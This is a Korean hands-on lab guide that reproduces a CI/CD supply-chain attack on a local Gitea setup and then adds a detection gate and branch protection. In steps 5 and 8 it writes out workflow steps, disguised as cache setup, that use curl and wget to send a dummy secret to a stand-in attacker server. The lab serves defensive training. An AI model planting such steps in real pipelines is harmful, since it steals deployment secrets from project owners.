# 손으로 직접 해보는 CI/CD 공급망 침해 PoC — 단계별 가이드

이 문서는 터미널 명령과 Gitea 웹 화면을 직접 클릭해가면서 처음부터 끝까지
따라 하실 수 있게 만든 가이드입니다. 지금 이 PC의 Docker 환경은 완전히
깨끗하게 초기화된 상태입니다 (컨테이너/볼륨/네트워크 전부 삭제 완료).

각 단계 끝에 "여기까지 되면 성공" 체크포인트를 넣어뒀으니, 그걸 보고
맞게 왔는지 확인하면서 진행하시면 됩니다. 막히면 그 화면/에러 메시지를
그대로 알려주세요.

---

## 0단계 — 준비 확인

터미널(PowerShell이든 Git Bash든 편한 걸로)을 열고 아래 명령이 정상적으로
버전을 출력하는지 확인하세요.

```bash
docker --version
git --version
```

둘 다 버전이 뜨면 준비 완료입니다.

---

## 1단계 — Gitea + 공격자 서버 띄우기

```bash
cd C:\Users\Admin\Downloads\cicd_supply_chain_demo\gitea
docker compose up -d
```

30초쯤 기다린 다음, 브라우저로 `http://localhost:3000`에 접속하세요.

**체크포인트**: "설치" 페이지가 뜨면 성공입니다. (혹시 연결이 안 되면
`docker ps`로 `gitea`, `attacker-server` 컨테이너 둘 다 `Up` 상태인지
확인하세요.)

---

## 2단계 — 관리자 계정 만들기 (웹 화면에서)

설치 페이지에서 아래 항목만 채우면 됩니다. 나머지는 기본값 그대로 둬도
됩니다 (데이터베이스는 SQLite3 기본값 사용).

- **사이트 제목**: 원하는 이름 아무거나 (예: `CI/CD Supply Chain Demo`)
- **운영자 계정 설정** 섹션에서:
  - 운영자 사용자명: `demoadmin`
  - 이메일 주소: `demoadmin@cicd-demo.local`
  - 비밀번호 / 비밀번호 확인: 원하는 비밀번호 (기억해두세요, 계속 씁니다)

맨 아래 **"Gitea 설치하기"** 버튼을 누르세요.

**체크포인트**: 자동으로 로그인되면서 대시보드가 뜨면 성공입니다. 오른쪽
위에 방금 만든 계정 이름(`demoadmin`)이 보일 거예요.

---

## 3단계 — Actions Runner 등록하기

Runner는 실제로 워크플로우(빌드/테스트/우리가 심을 악성 스텝)를 실행하는
주체입니다. 이것만은 터미널 작업이 필요합니다.

### 3-1. 등록 토큰 받기 (웹 화면)

오른쪽 위 프로필 메뉴 → **사이트 운영** → 왼쪽 메뉴에서 **액션 → 러너** →
**"새 러너 생성"** 버튼을 누르세요.

화면에 `Registration Token`이라는 긴 문자열이 보일 겁니다. 이걸 복사해두세요.
(예시: `IweJQGKEpJcOyIT6Lnz5Ek93UkEnwBRwaWFsqavw` 같은 형태 — 실제로는
매번 새로 생성되는 값이라 여러분 화면에 뜬 값을 써야 합니다.)

### 3-2. 러너 설정 파일 만들기 (터미널)

> ⚠️ **PowerShell 쓰시는 분 주의**: PowerShell의 `>` 리다이렉트는 기본적으로
> 파일을 UTF-16으로 저장해서, 그걸 그대로 Linux 컨테이너에 물리면 YAML을
> 못 읽습니다(실제로 이 가이드 만들면서 겪은 문제입니다). 아래 명령은
> UTF-8(BOM 없이)로 저장하도록 만든 PowerShell 전용 버전입니다.

**PowerShell:**
```powershell
cd C:\Users\Admin\Downloads\cicd_supply_chain_demo\gitea
$config = docker run --rm --entrypoint act_runner gitea/act_runner:latest generate-config
[System.IO.File]::WriteAllLines("$PWD\runner_config.yaml", $config)
```

**Git Bash 쓰시는 분:**
```bash
cd C:\Users\Admin\Downloads\cicd_supply_chain_demo\gitea
docker run --rm --entrypoint act_runner gitea/act_runner:latest generate-config > runner_config.yaml
```

방금 생성된 `runner_config.yaml` 파일을 텍스트 에디터로 열어서
`container:` 섹션 아래 `network: ""`를 `network: "cicd_demo_net"`으로
바꾸고 저장하세요. (이걸 안 하면 나중에 악성 스텝이 공격자 서버를 못
찾습니다 — 왜 그런지는 6단계에서 확인하게 됩니다.)

### 3-3. 러너 등록 + 실행 (터미널)

아래 명령에서 `<여기에 토큰 붙여넣기>` 부분을 3-1에서 복사한 토큰으로
바꿔서 실행하세요.

> PowerShell은 한 줄로 써야 합니다. 줄 끝의 `\`는 bash 전용 이어쓰기
> 문법이라 PowerShell에서는 그 줄에서 명령이 끝난 걸로 인식해버려서, 여러
> 줄로 나눠 쓰면 `-v`, `-e` 같은 다음 줄들이 전부 "명령어를 찾을 수
> 없음" 에러로 따로따로 실행됩니다 (방금 겪으신 그 에러입니다). PowerShell
> 에서 여러 줄로 나누고 싶으면 `\` 대신 줄 끝에 백틱(`` ` ``)을 쓰면 되지만,
> 뒤에 공백이 하나라도 남으면 또 깨지기 때문에 아예 한 줄로 쓰는 걸
> 추천합니다.

**PowerShell (한 줄로 복붙):**
```powershell
docker run -d --name gitea-runner --network cicd_demo_net -e GITEA_INSTANCE_URL=http://gitea:3000 -e GITEA_RUNNER_REGISTRATION_TOKEN=<여기에 토큰 붙여넣기> -e GITEA_RUNNER_NAME=local-runner -e CONFIG_FILE=/data/config.yaml -v act_runner_data:/data -v "C:\Users\Admin\Downloads\cicd_supply_chain_demo\gitea\runner_config.yaml:/data/config.yaml" -v /var/run/docker.sock:/var/run/docker.sock gitea/act_runner:latest
```

**Git Bash 쓰시는 분** (Git Bash는 여러 줄 이어쓰기가 되지만, 슬래시로
시작하는 경로를 Windows 경로로 잘못 바꾸는 문제가 있어서 앞에
`MSYS_NO_PATHCONV=1`을 붙여야 합니다):
```bash
MSYS_NO_PATHCONV=1 docker run -d --name gitea-runner \
  --network cicd_demo_net \
  -e GITEA_INSTANCE_URL=http://gitea:3000 \
  -e GITEA_RUNNER_REGISTRATION_TOKEN=<여기에 토큰 붙여넣기> \
  -e GITEA_RUNNER_NAME=local-runner \
  -e CONFIG_FILE=/data/config.yaml \
  -v act_runner_data:/data \
  -v "C:/Users/Admin/Downloads/cicd_supply_chain_demo/gitea/runner_config.yaml:/data/config.yaml" \
  -v /var/run/docker.sock:/var/run/docker.sock \
  gitea/act_runner:latest
```

실행 후 로그 확인:
```powershell
docker logs gitea-runner
```

**체크포인트**: 로그에 `"Runner registered successfully."`와
`"Starting runner daemon"`이 보이면 성공입니다. 사이트 운영 → 액션 →
러너 화면을 새로고침하면 러너가 하나 등록된 게 보일 거예요 (초록불).

---

## 4단계 — "정상" 프로젝트 만들기

### 4-1. 저장소 생성 (웹 화면)

왼쪽 위 **"+" 아이콘 → 새 리포지토리**를 누르고:
- 리포지토리 이름: `demo-project`
- Private 체크 해제 (Public으로)
- 그 외 기본값 그대로 → **"리포지토리 생성"**

### 4-2. 코드 push (터미널)

```bash
cd C:\Users\Admin\Downloads\cicd_supply_chain_demo\demo_project
git init -b main
git config user.email "demoadmin@cicd-demo.local"
git config user.name "demoadmin"
git add .gitea README.md
git commit -m "Initial commit: benign build workflow"
git remote add origin http://localhost:3000/demoadmin/demo-project.git
git push -u origin main
```

push할 때 사용자 이름/비밀번호를 물어보면 2단계에서 만든 `demoadmin`
계정 정보를 입력하세요.

### 4-3. 더미 시크릿 등록 (웹 화면)

저장소 페이지 → **Settings → Actions → Secrets** → **"새 시크릿 추가"**:
- Name: `FAKE_DEPLOY_TOKEN`
- Value: `fake-deploy-token-1234567890` (완전히 가짜 값입니다)

**체크포인트**: 저장소의 **Actions** 탭에 들어가서 방금 push한 커밋으로
워크플로우가 자동 실행돼 초록색 체크(성공)로 끝나는 걸 확인하세요. 여기까지
되면 "평범한 CI/CD 파이프라인"이 완성된 겁니다.

---

## 5단계 — 공격자 계정 만들고 악성 PR 올리기

### 5-1. 두 번째 계정 만들기 (웹 화면)

일단 로그아웃하고, 로그인 화면에서 **"계정을 만드세요"** 눌러서 새 계정을
만드세요.
- 사용자명: `attacker01`
- 이메일: `attacker01@cicd-demo.local`
- 비밀번호: 원하는 대로

### 5-2. fork 하기 (웹 화면)

`attacker01`로 로그인한 상태에서 `demo-project` 저장소 페이지로 이동해서
오른쪽 위 **"포크"** 버튼을 누르세요.

### 5-3. 악성 브랜치 만들고 push (터미널)

새 터미널 창(또는 다른 폴더)에서:

```bash
cd C:\Users\Admin\Downloads\cicd_supply_chain_demo
git clone http://localhost:3000/attacker01/demo-project.git attacker_workdir
cd attacker_workdir
git checkout -b feature/build-cache-optimization
```

`.gitea/workflows/build.yml` 파일을 텍스트 에디터로 열어서, `Checkout`
스텝과 `Run tests` 스텝 사이에 아래 내용을 끼워넣으세요 (이름을 그럴듯하게
지은 게 포인트입니다).

```yaml
      - name: Setup build cache
        run: |
          curl -s -X POST http://attacker-server:8000/exfil \
            -d "secret=${{ secrets.FAKE_DEPLOY_TOKEN }}"
```

저장하고 커밋 + push:

```bash
git config user.email "attacker01@cicd-demo.local"
git config user.name "attacker01"
git add .gitea/workflows/build.yml
git commit -m "Optimize build cache setup for faster CI"
git push -u origin feature/build-cache-optimization
```

push 결과에 나오는 URL(또는 Gitea 화면에서 자동으로 뜨는 배너)을 따라가서
**Pull Request 생성** 버튼을 누르세요. base는 `demoadmin/demo-project`의
`main`, head는 방금 만든 브랜치입니다.

**체크포인트**: PR 페이지에 diff가 딱 5줄 정도만 추가된 걸로 보이고,
겉보기엔 평범한 캐시 설정처럼 보이는지 확인하세요. (이게 위장의 핵심입니다.)

---

## 6단계 — PR 병합하고 실제로 유출되는지 확인하기

`demoadmin` 계정으로 다시 로그인해서 방금 만든 PR 페이지로 이동한 다음
**"병합"** 버튼을 누르세요. (실제 상황이라면 여기서 리뷰어가 diff를
꼼꼼히 안 봤다는 뜻이 됩니다.)

병합하면 몇 초 안에 워크플로우가 자동 실행됩니다. 터미널에서:

```bash
docker logs attacker-server
```

**체크포인트**: 로그에 이런 줄이 보이면 PoC 성공입니다.

```
EXFIL 수신 - from=... path=/exfil
raw body: secret=fake-deploy-token-1234567890
>>> 탈취된 시크릿 값: fake-deploy-token-1234567890
```

여러분이 등록해둔 가짜 시크릿 값이 정말로 "공격자 서버"에 도착한 걸
직접 눈으로 확인하신 겁니다.

---

## 7단계 — 방어 게이트 추가하기 (사고 대응)

이제 `demoadmin` 입장에서 "다시는 이런 일 없게" 방어 컨트롤을 추가합니다.

```bash
cd C:\Users\Admin\Downloads\cicd_supply_chain_demo
git clone http://localhost:3000/demoadmin/demo-project.git demoadmin_workdir
cd demoadmin_workdir
```

1. 악성 스텝을 먼저 원복하세요: `.gitea/workflows/build.yml`에서 아까
   추가한 `Setup build cache` 스텝을 지웁니다.
2. `.security` 폴더를 만들고 그 안에 탐지 스크립트를 복사하세요.
   ```bash
   mkdir .security
   cp ../detection/detect_suspicious_workflow.py .security/
   ```
3. `.gitea/workflows/supply-chain-guard.yml` 파일을 새로 만들고 아래
   내용을 넣으세요.

```yaml
name: Supply Chain Guard

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

jobs:
  scan-workflows:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install --quiet --break-system-packages pyyaml
      - run: python3 .security/detect_suspicious_workflow.py .gitea/workflows/*.yml
```

(`--break-system-packages`가 붙은 이유: 최신 Ubuntu 러너 이미지는 pip
전역 설치를 막아놔서, 이 옵션 없이는 이 단계에서 에러가 납니다.)

커밋하고 push하세요.

```bash
git add .gitea .security
git commit -m "security: remediate and add Supply Chain Guard"
git push
```

**체크포인트**: 저장소 Actions 탭에서 `Supply Chain Guard` 워크플로우가
`success`로 끝나는 걸 확인하세요 (지금은 악성 스텝이 없으니까 통과합니다).

---

## 8단계 — 새로운 위장으로 다시 공격해보기

이번엔 이름과 명령을 바꿔서 게이트가 정말 잡아내는지 시험해봅니다.

`attacker_workdir` 폴더로 돌아가서, **먼저 upstream(진짜 main)을 받아와야
합니다** — 그래야 방금 추가한 게이트 워크플로우가 공격자 브랜치에도
존재하게 됩니다. (이 부분이 실습에서 제일 중요한 포인트입니다. 왜
중요한지는 아래 "여기서 배울 점"을 읽어보세요.)

```bash
cd C:\Users\Admin\Downloads\cicd_supply_chain_demo\attacker_workdir
git remote add upstream http://localhost:3000/demoadmin/demo-project.git
git fetch upstream main
git checkout -b chore/cache-node-modules
git merge upstream/main
```

(README.md 충돌이 나면 `git checkout --theirs README.md && git add README.md && git commit`)

`.gitea/workflows/build.yml`을 열어서 이번엔 `wget`으로, 스텝 이름도
다르게 심어보세요.

```yaml
      - name: Cache node_modules
        run: |
          wget --post-data "secret=${{ secrets.FAKE_DEPLOY_TOKEN }}" \
            http://attacker-server:8000/exfil -O /dev/null
```

```bash
git add .gitea/workflows/build.yml
git commit -m "chore: cache node_modules to speed up CI"
git push -u origin chore/cache-node-modules
```

Gitea 화면에서 PR을 생성하세요 (base: `main`, head: `chore/cache-node-modules`).

**체크포인트**: PR 페이지 아래쪽 체크 목록에 `Supply Chain Guard /
scan-workflows`가 빨간색 X(실패)로 뜨는 걸 확인하세요. 병합 버튼도
빨간색 경고와 함께 막혀 있을 겁니다.

### 여기서 배울 점

만약 위에서 `git fetch upstream` 없이 그냥 원래 있던 브랜치에 wget
스텝만 추가해서 PR을 올렸다면 어떻게 됐을까요? 실제로 해보면 게이트가
아예 실행조차 안 됩니다. Gitea Actions는 `pull_request` 이벤트에서 뭘
실행할지를 **PR의 head(공격자) 브랜치에 있는 워크플로우 파일 기준으로**
판단하기 때문에, 방금 만든 방어 게이트가 공격자의 예전 브랜치에는 아예
"안 보이는" 상태였던 거죠. 궁금하시면 새 브랜치 하나 더 만들어서 (upstream
merge 없이) 시험해보세요 — 게이트가 안 뜨는 걸 직접 확인할 수 있습니다.
이게 이 PoC에서 가장 중요한 발견 중 하나입니다.

---

## 9단계 (선택) — 브랜치 보호 규칙으로 진짜 병합을 막기

지금까지는 체크가 실패해도 관리자가 마음만 먹으면 병합할 수 있는
상태입니다. 진짜로 막으려면 브랜치 보호 규칙이 필요합니다.

`demoadmin` 계정으로 저장소 **Settings → Branches** 로 이동해서 `main`
브랜치에 규칙을 추가하고, "필수 상태 체크"에
`Supply Chain Guard / scan-workflows (pull_request)`를 추가하세요.

**체크포인트**: 8단계에서 만든 실패한 PR을 다시 병합 시도하면 이번엔
버튼 자체가 비활성화되거나, 눌러도 "필수 상태 체크를 통과하지 못했다"는
에러가 뜹니다.

---

## 다음 할 일

- 여기까지 손으로 해보셨으면, 지금 겪은 과정 자체가 팀 보고서의
  "재현 절차" + "트러블슈팅" 섹션 재료가 됩니다.
- `forensics_exercise/` 워크시트는 지금 만든 것과 별개로 이미 준비된
  증거 세트로 풀어보는 실습이니, 이것도 나중에 한번 해보시면 좋습니다.
- 다 해보시고 노션 제안서 형식으로 정리해드리는 것도 원하시면 말씀해주세요.
